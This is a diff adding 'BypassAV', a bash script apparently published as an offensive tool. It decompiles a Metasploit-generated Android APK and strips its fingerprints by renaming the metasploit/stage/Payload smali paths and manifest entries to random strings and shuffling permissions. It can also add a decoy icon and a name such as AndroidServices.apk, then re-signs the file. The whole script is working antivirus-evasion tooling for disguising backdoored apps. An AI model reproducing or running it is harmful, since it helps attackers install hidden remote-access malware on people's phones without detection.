@@ -1,0 +1,196 @@
+#!/bin/bash 
+
+# Author: graylagx2
+# Version: 1.0
+# Description: This script will remove the obvious fingerprints of metasploit through out a given apk file.
+# Contact: graylagx2@unseen.is
+
+RED=$'\e[1;31m'
+GREEN=$'\e[1;32m'
+YELLOW=$'\e[1;33m'
+BLUE=$'\e[1;34m'
+RESTORE=$'\e[0m'
+
+spinLoader() {
+pid=$!
+spin='\|/-'
+i=0
+while kill -0 $pid 2>/dev/null
+do
+  i=$(( (i+1) %4 ))
+  printf "\r${BLUE}[${spin:$i:1}]${RESTORE} $PROG_MESSAGE"
+  sleep .1
+done
+printf "\r   ${GREEN}[-]${RESTORE} $COMP_MESSAGE"
+sleep 1 
+}
+
+# Checking internet connection and installing pkgs if needed 
+installPkgs() {
+[[ $(wget -q --tries=5 --timeout=20 --spider http://google.com ; echo $?) != 0 ]] && echo -e "${RED}Warning!${YELLOW} This script needs an internet connection!" && echo && echo -e "${YELLOW}Please connect to the internet and try again.${RESTORE}" && exit
+apt-get install zipalign -y &>/dev/null &
+PROG_MESSAGE="Installing zipalign to align android applications "
+COMP_MESSAGE="Installed zipalign to align android applications "
+spinLoader;echo
+}
+[[ $(dpkg-query -s zipalign &>/dev/null ; echo $?) = 0 ]] || installPkgs
+
+# Handling some input arguments
+USAGE() {     
+    echo;echo -e "${YELLOW}Usage: ${BLUE}BypassAV <path/to/file.apk>\n
+${YELLOW}Options:${BLUE}
+  -o  <outputname.apk>        Sets the name of custom output file
+  -i  <path/to/image.png>     Sets image.png as the icon of the file.apk
+  -h                          Help menu\n
+${YELLOW}Examples:${BLUE} 
+BypassAV /root/backdoor.apk
+BypassAV /root/backdoor.apk -o AndroidServices.apk
+BypassAV /root/backdoor.apk -o AndroidServices.apk -i /root/settings.png${RESTORE}
+";echo;exit
+}
+[[ $# -eq 0 ]] && bash $0 -h && exit
+while test $# -gt 0; do
+    case "$1" in
+        -h|--help)
+                USAGE
+                ;;
+        *.apk)
+                if [ -n $1 ]; then
+                    export APP_PATH=$1
+                else
+                    echo -e "${RED}ERROR: ${YELLOW}Input apk not set${RESTORE}"
+                    USAGE
+                fi
+                shift
+                ;;
+        -o)
+                shift
+                if [ $# -gt 0 ]; then
+                    export APP_NAME=$1
+                else
+                    echo -e "${RED}ERROR: ${YELLOW}Output apk name not set${RESTORE}"
+                    USAGE
+                    exit 1
+                fi
+                shift
+                ;;
+        -i)
+                shift
+                if [ $# -gt 0 ]; then
+                    export ICON_PATH=$1
+                else
+                    echo -e "${RED}ERROR: ${YELLOW}Input png image not set${RESTORE}"
+                    USAGE
+                    exit 1
+                fi
+                shift
+                ;;
+        *)
+                USAGE
+                ;;
+    esac
+done
+[[ -z $APP_NAME ]] && [[ -n $APP_PATH ]] && APP_NAME=$(basename $APP_PATH)
+
+echo -e "${BLUE}"
+echo '
+           ____  __ __ ____   ____  __________       ____ __ __ 
+          |    \|  T  |    \ /    T/ ___/ ___/      /    |  T  |
+          |  o  |  |  |  o  Y  o  (   \(   \_ _____Y  o  |  |  |
+          |     |  ~  |   _/|     |\__  \__  |     |     |  |  |
+          |  O  l___, |  |  |  _  |/  \ /  \ l_____|  _  l  :  !
+          |     |     |  |  |  |  |\    \    |     |  |  |\   / 
+          l_____l____/l__j  l__j__j \___j\___j     l__j__j \_/ '                                                                   
+echo -e "\n${YELLOW}                       Version: ${BLUE}1.0 ${YELLOW}Author: ${BLUE}graylagx2${RESTORE}\n"
+
+# Handling user ERROR on NO-PATH
+if [ $(echo $APP_PATH | grep "/" &>/dev/null; echo $?) = 1 ]; then
+    APP_PATH=$(find / -name "$APP_PATH" ! -path '*/root/.local/share/Trash/files/*' ! -path '*/root/Bypass_AV/Bleached/*' 2>/dev/null)
+
+        if (( $(echo $APP_PATH | cut -d '.' -f2 | wc -w) > 1 )); then 
+            zenity --width=300 --height=200 --info --text="There are multiple PATHWAYS to your application: \n \n $APP_PATH \n \n When the file selection window opens please select the file you wish to use."
+            APP_PATH=$(zenity --file-selection || echo -e "ERROR: No selection")
+        fi
+[[ $APP_PATH = "ERROR: No selection" ]] && echo -e "${RED}ERROR: ${YELLOW}No selection.${RESTORE}" && exit
+fi
+
+# Handling user ERROR on NOT-VALID-APK
+if [ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]; then
+    zenity --width=250 --height=150 --info --text="$APP_PATH \n \n Is not a valid  PATH or APK when file selection window opens please select a valid apk file."
+    APP_PATH=$(zenity --file-selection || echo -e "ERROR: No selection")
+[[ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]] && echo -e "${RED}ERROR: ${YELLOW}Not valid APK.${RESTORE}" && exit
+fi 
+
+
+
+
+# Variables to rename directories, files or pathways in apk
+M_SMALI_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
+S_SMALI_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
+P_SMALI_FILE=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
+
+# Decompile apk
+(apktool d $APP_PATH -o /tmp/Bypass_AV/Decompiled &>/dev/null; sleep 3) &
+PROG_MESSAGE="Decompiling $(basename $APP_PATH)"
+COMP_MESSAGE="Decompiled $(basename $APP_PATH)"
+spinLoader;echo
+
+# Injecting custom icon if -i is set
+(if [ -n $ICON_PATH ] && [ $(file $ICON_PATH 2>/dev/null | grep "image" &>/dev/null; echo $?) = 0 ]; then
+    sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/icon" >|g' /tmp/Bypass_AV/Decompiled/AndroidManifest.xml;
+    mkdir /tmp/Bypass_AV/Decompiled/res/drawable-ldpi-v4 /tmp/Bypass_AV/Decompiled/res/drawable-mdpi-v4 /tmp/Bypass_AV/Decompiled/res/drawable-hdpi-v4;
+    convert -resize 72x72 $ICON_PATH /tmp/Bypass_AV/Decompiled/res/drawable-hdpi-v4/icon.png;
+    convert -resize 48x48 $ICON_PATH /tmp/Bypass_AV/Decompiled/res/drawable-mdpi-v4/icon.png;
+    convert -resize 36x36 $ICON_PATH /tmp/Bypass_AV/Decompiled/res/drawable-ldpi-v4/icon.png;
+elif [ -n $ICON_PATH ] && [ $(file $ICON_PATH 2>/dev/null | grep "image" &>/dev/null; echo $?) = 1 ]; then
+    printf "${RED}[-] ${YELLOW}Failed to inject app icon${RESTORE}\n";
+fi;
+sleep 3;) &
+PROG_MESSAGE="Injecting custom icon"
+COMP_MESSAGE="Injected custom icon"
+spinLoader;echo
+
+# Shuffle permissions and replace any metasploit/stage or metasploit.stage pathways and mentions.
+(sed -i "2,22{N;N;s/\(.*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/};s/metasploit.stage/$M_SMALI_DIR.$S_SMALI_DIR/g;s/metasploit/$M_SMALI_DIR/g" /tmp/Bypass_AV/Decompiled/AndroidManifest.xml;
+
+# Change app name 
+sed -i "s/MainActivity/${APP_NAME%%.*}/g" /tmp/Bypass_AV/Decompiled/res/values/strings.xml;
+
+# Renaming directorie-names and files-names to replace any mention of metaplsoit,stage or  Payload
+mv /tmp/Bypass_AV/Decompiled/smali/com/metasploit/ /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR;
+mv /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/stage /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR;
+mv /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/Payload.smali /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/$P_SMALI_FILE.smali;
+
+# Replacing any mention of metasploit-stage-payload in all smali files
+sed -i -e "s|metasploit/stage|$M_SMALI_DIR/$S_SMALI_DIR|" /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/* -e "s|Payload|$P_SMALI_FILE|" /tmp/Bypass_AV/Decompiled/smali/com/$M_SMALI_DIR/$S_SMALI_DIR/*;
+
+sleep 3) & 
+PROG_MESSAGE="Bleaching $(basename $APP_PATH)"
+COMP_MESSAGE="Bleached $(basename $APP_PATH)"
+spinLoader;echo
+
+# Rebuild apk
+(apktool b /tmp/Bypass_AV/Decompiled -o /tmp/Bypass_AV/temp.apk &>/dev/null; sleep 3) &
+PROG_MESSAGE="Rebuilding $(basename $APP_PATH) as $APP_NAME"
+COMP_MESSAGE="Rebuilt $(basename $APP_PATH) as $APP_NAME"
+spinLoader;echo
+ 
+# Generate key,sign and align apk
+(yes "yes" | keytool -genkey -v -keystore /tmp/Bypass_AV/${APP_NAME%%.*}.keystore -alias ${APP_NAME%%.*} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null;
+jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore /tmp/Bypass_AV/${APP_NAME%%.*}.keystore temp.apk ${APP_NAME%%.*} &>/dev/null;
+zipalign -f 4 /tmp/Bypass_AV/temp.apk /tmp/Bypass_AV/$APP_NAME) &
+PROG_MESSAGE="Generating key --> Signing --> Aligning [$APP_NAME]"
+COMP_MESSAGE="Generated key --> Signined --> Aligned [$APP_NAME]"
+spinLoader;echo
+
+# Move files into home directory/Bypass_AV/Clean and clean up
+[ ! -d ~/Bypass_AV -o ! -d ~/Bypass_AV/Clean ] && mkdir -p ~/Bypass_AV/Bleached 
+(mv --backup=numbered /tmp/Bypass_AV/$APP_NAME /tmp/Bypass_AV/${APP_NAME%%.*}.keystore -t ~/Bypass_AV/Bleached; 
+rm -r /tmp/Bypass_AV;
+sleep 3) &
+PROG_MESSAGE="Moving $APP_NAME to ~/Bypass_AV/Bleached"
+COMP_MESSAGE="Moved $APP_NAME to ~/Bypass_AV/Bleached"
+spinLoader;echo;echo
+
+
+
